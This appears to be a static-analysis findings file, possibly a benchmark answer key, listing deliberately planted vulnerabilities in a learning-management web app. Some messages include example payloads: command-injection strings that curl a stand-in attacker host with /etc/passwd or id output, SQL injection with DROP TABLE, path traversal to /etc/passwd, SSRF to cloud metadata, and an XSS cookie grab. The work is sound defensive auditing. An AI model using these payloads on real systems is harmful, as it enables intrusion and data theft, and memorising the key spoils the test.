@@ -1,0 +1,761 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.sql-injection-raw-string",
+      "path": "src/lib/queries.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadSubmissionsExportRows() builds `filterClause` by directly interpolating the `courseCode` and `since` request parameters into a raw SQL string via sql.raw(), with no escaping or parameter binding. It is called from src/app/api/export/submissions/route.ts with `course_code`/`since` taken straight from the query string, letting an admin-authenticated attacker break out of the quoted string (e.g. course_code=x' OR '1'='1) to exfiltrate arbitrary rows or tamper with the query.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-raw-string",
+      "path": "src/lib/queries.ts",
+      "start": {
+        "line": 140,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 160,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchGradingQueue() builds SQL clauses as `s.${field} = '${value.replace(/'/g,\"\")}'` using sql.raw() for both the column name and value from user-supplied `criteria`. Only single quotes are stripped from the value; the `field` (column name) is fully attacker-controlled and unescaped, and the value can still contain other SQL metacharacters/backslashes. Called from src/app/(app)/grading/page.tsx via the `advSearch` query parameter (parsed into arbitrary field=value pairs), allowing SQL injection through the column-name position and incomplete value sanitization.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-order-by",
+      "path": "src/lib/queries.ts",
+      "start": {
+        "line": 200,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 210,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "cohortRosterSortedForPrintout() interpolates the `sortBy` parameter directly into a raw SQL ORDER BY clause via sql.raw() with no allowlist or escaping. It is called from src/app/api/v1/cohorts/[id]/roster/printout/route.ts with `sort_by` taken directly from the query string, letting an authorized-but-malicious cohort manager inject arbitrary SQL (e.g. `sort_by=1;DROP TABLE users;--` or UNION-based data exfiltration) since ORDER BY cannot be parameterized and no column allowlist is applied here (contrast with the safe `cohortRosterSortedForDistrictReport` counterpart below it).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.mass-assignment.prototype-pollution",
+      "path": "src/lib/courseDefaults.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "foldFieldsInto() recursively copies every key from an attacker/admin-supplied JSON object onto `courseDefaults` without excluding `__proto__`, `constructor`, or `prototype`. Called via applyDistrictSettingsOverride() from src/actions/admin.ts's importCourseDefaultsAction, which parses an uploaded JSON file with no schema validation. A payload like `{\"__proto__\":{\"polluted\":true}}` pollutes Object.prototype for the whole Node.js process, potentially affecting authorization/business logic elsewhere in the app.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.mass-assignment.privilege-escalation",
+      "path": "src/actions/account.ts",
+      "start": {
+        "line": 76,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 96,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restorePortalProfileAction() parses an uploaded JSON file into an arbitrary `fields` object and passes it directly to `db.update(users).set(fields)` with no field allowlist. Any authenticated user (including a plain student) can upload a file containing `{\"role\":\"school_admin\",\"isActive\":true}` and have it written straight onto their own users row, escalating their privileges to school_admin. Compare to the safe counterpart restoreDigestPreferencesAction just below, which only ever writes explicitly allowlisted fields.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.mass-assignment.unauthorized-field-write",
+      "path": "src/actions/submissions.ts",
+      "start": {
+        "line": 188,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 210,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importFieldPlacementNoteAction() parses a freeform JSON string (`exportedRow`) and writes it directly onto the submission row via `db.update(submissions).set(fields)` with no allowlist. A TA (who only has \"review\" access, not \"manage\") can set arbitrary columns including `gradeReleased: true`, `grade`, or `studentId`, bypassing the manage-only grade-release restriction enforced elsewhere (releaseGradeAction). Compare to the safe counterpart importFieldPlacementScoreAction below, which only writes two explicitly-typed fields.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection.string-concat-shell",
+      "path": "src/lib/certificates.ts",
+      "start": {
+        "line": 35,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "printCertificateBatch() builds a shell command string `wkhtmltopdf --page-layout ${layoutPreset} ${srcPath} ${outPath}` and executes it with `spawn(cmd, { shell: true })`. `layoutPreset` comes straight from the JSON body in src/app/api/v1/courses/[id]/certificates/print-batch/route.ts (`body?.layoutPreset`) with no validation, so an instructor with course-manage access can inject shell metacharacters (e.g. `letter; curl http://attacker/$(cat /etc/passwd)#`) to execute arbitrary OS commands on the server. The safe counterpart printTranscriptBatch below validates against ALLOWED_TRANSCRIPT_LAYOUTS and uses argv-array spawn with shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection.string-concat-execsync",
+      "path": "src/app/api/courses/[id]/syllabus-export/route.ts",
+      "start": {
+        "line": 26,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportCourseSyllabus() runs `execSync(\\`pandoc ${srcPath} -o ${outPath} --to=${outputFormat}\\`)` where `outputFormat` is taken unvalidated from the request body (`body?.outputFormat`) in the POST handler below. execSync runs through a shell by default, so a value like `pdf; curl http://attacker/$(id)` achieves arbitrary command execution. Contrast with src/app/api/courses/[id]/handout-export/route.ts, which validates outputFormat against an ALLOWED_OUTPUT_FORMATS allowlist and uses argv-array spawn with shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.jwt-none-algorithm",
+      "path": "src/lib/vendorFeedAuth.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveVendorFeedIdentity() calls jwt.verify(token, VENDOR_FEED_SECRET, { algorithms: [\"HS256\", \"none\"] }), permitting the unsigned \"none\" JWT algorithm. Any attacker can craft a token with `{\"alg\":\"none\"}` and an arbitrary `vendorId` payload with no signature at all and have it accepted as a valid identity. This function is the sole authentication check for src/app/api/v1/attendance-hardware-feed/route.ts, so an unauthenticated attacker can fully bypass hardware-feed authentication.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control.header-based-auth-bypass",
+      "path": "src/lib/rosterVendorTrust.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePartnerAssertedRole() derives an \"elevated\" privilege flag purely from client-supplied, unauthenticated headers (`x-sync-partner-role`, `x-sync-partner-hint`) with a loose `==` comparison and truthy check. In src/app/api/v1/cohorts/[id]/staff-summary/route.ts line 20, `if (!access.canManage && !elevated)` means any authenticated user can bypass the course-management authorization check entirely by sending `x-sync-partner-role: district-admin` and `x-sync-partner-hint: {\"access\":true}`, gaining access to any cohort's staff summary without real course access.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-290: Authentication Bypass by Spoofing",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control.cookie-based-idor",
+      "path": "src/app/api/v1/cohorts/[id]/roster/route.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 33,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadCohortRosterForFacilitator() authorizes access to a cohort's roster (names, emails, phone numbers) solely by comparing a client-writable `cohortEditScope` cookie value to the requested cohort id, with no check that the requesting user is actually enrolled in or manages that cohort's course. Any authenticated user can set `document.cookie=\"cohortEditScope=<any id>\"` and call GET /api/v1/cohorts/<id>/roster to read any cohort's full roster PII.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control.missing-authz-idor",
+      "path": "src/app/api/v1/notifications/[id]/route.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadNotificationDetail() fetches a notification purely by its numeric id with no check that it belongs to the requesting user (`requireUser()` only verifies the caller is logged in). Any authenticated user can enumerate notification ids in GET /api/v1/notifications/{id} to read other users' private notification content. Contrast with the sibling dismiss endpoint (src/app/api/v1/notifications/[id]/dismiss/route.ts), which correctly scopes the query with `eq(notifications.userId, userId)`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control.missing-authz",
+      "path": "src/app/api/v1/cohorts/[id]/checkpoint/status/route.ts",
+      "start": {
+        "line": 23,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 53,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The GET handler only calls `requireUser()` (any authenticated user) with no requireCourseAccess()/getCourseAccess() check before reading checkpoint status for an arbitrary cohortId, unlike the sibling checkpoint/progress endpoint which requires \"review\" access on the cohort's course. Any logged-in user can query any cohort's checkpoint status. Additionally, `context=expanded` returns the raw error message and full stack trace to the client.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-209: Information Exposure Through an Error Message"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal.unsanitized-filename",
+      "path": "src/lib/checkpointArchive.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "archiveCheckpointNote() builds `fileName = \\`${label || \"note\"}.txt\\`` and joins it onto ARCHIVE_DIR with no sanitization of `label`. `label` comes directly from the `?label=` query parameter in src/app/api/v1/cohorts/[id]/checkpoint/note/route.ts. A value like `../../../../tmp/evil` lets an authorized cohort manager write a file (with attacker-controlled JSON body `text`) outside ARCHIVE_DIR. Compare to archiveCheckpointSummary() just below, which applies `path.basename(label)` before use.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal.unsanitized-filename",
+      "path": "src/lib/courseMedia.ts",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "saveCourseBanner() writes the uploaded file to `path.join(PUBLIC_MEDIA_DIR, file.name)` using the client-supplied `file.name` verbatim, with no sanitization, extension/MIME allowlist, or size check. A crafted multipart upload (e.g. filename `../../../../src/app/layout.tsx` or an executable extension) can write outside the public media directory or overwrite arbitrary files under it. Compare to the safe counterpart saveCourseBannerValidated(), which uses a MIME allowlist, size cap, and a randomly generated filename.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal.unsanitized-filename",
+      "path": "src/app/api/v1/course-templates/route.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadStarterPack() joins the unsanitized `pack` query parameter directly into `path.join(STARTER_PACKS_DIR, \\`${pack}.md\\`)` and reads it with fs.readFileSync. A request like `GET /api/v1/course-templates?pack=../../../../etc/passwd%00` (or any relative path escaping STARTER_PACKS_DIR) lets a school_admin read arbitrary files on the server filesystem. Compare to the safe counterpart in src/app/api/v1/rubric-templates/route.ts, which applies `path.basename(template)` before building the path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.xpath-injection",
+      "path": "src/lib/lessonDocumentSearch.ts",
+      "start": {
+        "line": 63,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 67,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchCourseLessons() builds the XPath expression `//lesson[contains(title, '${keyword}') and @track='${cachedTrack}']` by directly interpolating the unescaped `keyword` search string. `keyword` comes straight from the `?q=` query parameter in src/app/api/v1/courses/[id]/lessons/search/route.ts. A value like `') or '1'='1` breaks out of the intended predicate, letting any enrolled student bypass the track filter and search lessons outside their own section, or craft boolean-based XPath injection to enumerate lesson data. The safe counterpart searchCourseLessonsSafely() below escapes both inputs with escapeXPathString().",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.ldap-injection",
+      "path": "src/lib/staffDirectoryClient.ts",
+      "start": {
+        "line": 118,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 122,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "verifyStaffGroupMembership() builds the LDAP filter `(&(uid=${uid})(memberOf=cn=${groupCn},ou=groups,dc=district,dc=edu))` by directly interpolating `uid` and `groupCn` with no escaping, unlike findStaffByEmail() below which calls ldapEscape() first. Both parameters come straight from the JSON body in src/app/api/v1/cohorts/[id]/staff-directory-check/route.ts. An attacker with course-manage access can inject LDAP filter metacharacters (parentheses, `*`, `&`, `|`) to alter the query logic, e.g. supplying `groupCn` containing `)(uid=*` to match arbitrary staff regardless of group.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query (LDAP Injection)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection.new-function",
+      "path": "src/actions/curve.ts",
+      "start": {
+        "line": 38,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 41,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCustomCurveAction() builds `new Function(\"score\", \"maxPoints\", \\`return ${expression};\\`)` from the `expression` form field, which is arbitrary text typed by the requester. `new Function` compiles and executes JavaScript in the Node.js server process; the expression is not restricted to arithmetic and can escape the intended scope (e.g. via `constructor.constructor(...)(...)`) to run arbitrary code with the server's privileges.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code (Code Injection)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.ssrf.unvalidated-fetch-url",
+      "path": "src/app/api/v1/courses/[id]/resources/preview/route.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCourseResource() performs a server-side `fetch(sourceUrl, { redirect: \"follow\" })` where `sourceUrl` is taken directly from the request body with no scheme/host allowlist, unlike testIntegrationWebhookAction() in src/actions/courses.ts which validates against ALLOWED_INTEGRATION_HOSTS and requires https. An instructor can supply `sourceUrl` pointing at internal/cloud-metadata addresses (e.g. http://169.254.169.254/latest/meta-data/, http://localhost:<internal-port>/...) to make the server fetch internal resources on their behalf (SSRF), with the response content reflected back via the title/description regex extraction.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.xss.unsanitized-template-output",
+      "path": "src/app/(app)/courses/[id]/certificates/CertificateWordingDesigner.tsx",
+      "start": {
+        "line": 48,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 116,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The certificate preview HTML returned by POST /api/v1/courses/[id]/certificates/preview (rendered from the instructor-supplied `wording` field via Handlebars.compile in src/lib/certificates.ts renderCertificateDraft(), with no HTML sanitization) is injected via `dangerouslySetInnerHTML={{ __html: html }}` with no sanitization step. Handlebars only escapes substituted `{{expr}}` values, not literal markup already present in the template string, so wording containing `<img src=x onerror=alert(document.cookie)>` or `<script>` is preserved verbatim and executed in the browser. Contrast with src/components/RichText.tsx, which runs sanitizeRichText()/DOMPurify before the same sink.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.open-redirect.unvalidated-return-to",
+      "path": "src/app/api/v1/enrollment-invites/accept/route.ts",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 38,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "acceptEnrollmentInvite() takes `return_to` from the query string and passes it unvalidated into `NextResponse.redirect(new URL(returnTo, req.url))`. Since `new URL()` treats an absolute URL argument as taking precedence over the base, a value like `return_to=https://evil.example.com` causes the server to issue a 3xx redirect straight to the attacker's domain \u2014 useful for phishing after the victim clicks a legitimate-looking mailed invite link. Contrast with src/app/api/v1/cohort-transfers/confirm/route.ts, which validates `returnTo.startsWith(\"/\") && !returnTo.startsWith(\"//\")` before redirecting.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site (Open Redirect)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.cors.reflected-origin-with-credentials",
+      "path": "src/app/api/v1/catalog/route.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildCatalogResponse() reflects any request's `Origin` header back as `Access-Control-Allow-Origin` and additionally sets `Access-Control-Allow-Credentials: true` for every origin, with no allowlist check. This is a classic overly-permissive CORS misconfiguration that allows any third-party website to make credentialed cross-origin requests to this endpoint and read the response. Contrast with the sibling src/app/api/v1/catalog/highlights/route.ts, which checks the origin against a fixed ALLOWED_WIDGET_ORIGINS allowlist and never sets Allow-Credentials.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.insecure-cookie.missing-flags",
+      "path": "src/app/api/guardian-portal/route.ts",
+      "start": {
+        "line": 33,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 38,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openGuardianPortalContext() sets the `guardian_ctx` context-token cookie without `httpOnly`, `secure`, or `sameSite` attributes. This lets any script-injection vector (XSS elsewhere) read the token via document.cookie, and lets it be sent over plaintext HTTP or in cross-site requests. Contrast with the renew endpoint (src/app/api/guardian-portal/renew/route.ts), which sets the same cookie with httpOnly, secure (in production), and sameSite: \"strict\".",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag",
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.insecure-cookie.missing-flags",
+      "path": "src/app/api/v1/library-terminals/checkin/route.ts",
+      "start": {
+        "line": 33,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 40,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "attachTerminalSessionCookie() sets the `sessionId` session cookie (the actual authentication token for a full session, inserted into the `sessions` table) without `httpOnly`, `secure`, or `sameSite` attributes, exposing the live session token to theft via any XSS and to interception over plaintext HTTP. Contrast with the analogous src/app/api/v1/study-room-kiosks/checkin/route.ts, whose attachKioskSessionCookie() sets httpOnly, secure, and sameSite: \"strict\" for the same kind of session cookie.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag",
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.clickjacking.frame-options-removed",
+      "path": "src/app/api/v1/courses/[id]/certificates/embed/route.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 35,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderEmbeddableCertificateWidget() deletes the `X-Frame-Options` header entirely (`res.headers.delete(\"X-Frame-Options\")`) whenever the current user's role is school_admin, allowing this HTML response to be framed by any origin whatsoever for that session \u2014 not just the school's own portal. Contrast with the safer sibling src/app/api/v1/courses/[id]/certificates/print/route.ts, which scopes the relaxed policy to a specific TRUSTED_PORTAL_ORIGIN via a `frame-ancestors` CSP directive instead of removing framing protection altogether.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1021: Improper Restriction of Rendered UI Layers or Frames (Clickjacking)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.http-response-header-injection",
+      "path": "src/app/api/v1/courses/[id]/discussions/digest/route.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 31,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildDiscussionDigest() places the unsanitized `export_label` query parameter directly into the `Content-Disposition: attachment; filename=\"${filename}.txt\"` response header, with no stripping of CR/LF or quote characters. Contrast with the sibling src/app/api/v1/courses/[id]/discussions/archive/route.ts, whose buildDiscussionArchive() strips `\\r`/`\\n` and truncates the same kind of label before using it in the same header, indicating this is the intentionally-unsafe counterpart.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Response Splitting)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.xxe.unrestricted-doctype",
+      "path": "src/lib/notificationDigestPrefs.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "parseDigestPrefsCookie() parses a client-controlled cookie value directly as XML via DOMParser with no restriction on DOCTYPE/ENTITY declarations before parsing. It is called from src/app/api/v1/notifications/digest-preferences/route.ts with the raw `notifDigestPrefs` cookie value. The safe counterpart parseDigestPrefsCookieSafely() (used by the course discussion-digest variant) explicitly rejects any input containing `<!DOCTYPE` or `<!ENTITY` before parsing, indicating this path is the intentionally-vulnerable XXE-classed counterpart.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference (XXE)"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.insecure-randomness.weak-prng-for-secret",
+      "path": "src/actions/apikeys.ts",
+      "start": {
+        "line": 44,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 47,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "createIntegrationKeyAction() generates the API key secret and prefix with `Math.random().toString(36)` instead of a cryptographically secure generator. Math.random() is not cryptographically secure and its output can be predicted/brute-forced given enough samples, weakening the resulting `lms_sandbox_*` API key used for Bearer-token authentication in src/lib/apiauth.ts. Contrast with createApiKeyAction() above it, which uses randomToken() (crypto.randomBytes) for the same purpose.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.sensitive-data-exposure.cleartext-transmission",
+      "path": "src/lib/legacySync.ts",
+      "start": {
+        "line": 64,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 74,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "pushGradeBatchToLegacySis() sends the district's `LEGACY_SIS_API_KEY` as a plaintext URL query parameter (`http://${LEGACY_SIS_HOST}/intake/grades?api_key=${apiKey}`) over an unencrypted HTTP connection, exposing the credential to network eavesdroppers and to logging in any intermediary proxy/server access log. Contrast with pushAttendanceBatchToLegacySis() below, which sends the same credential over HTTPS via an Authorization header.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-319: Cleartext Transmission of Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
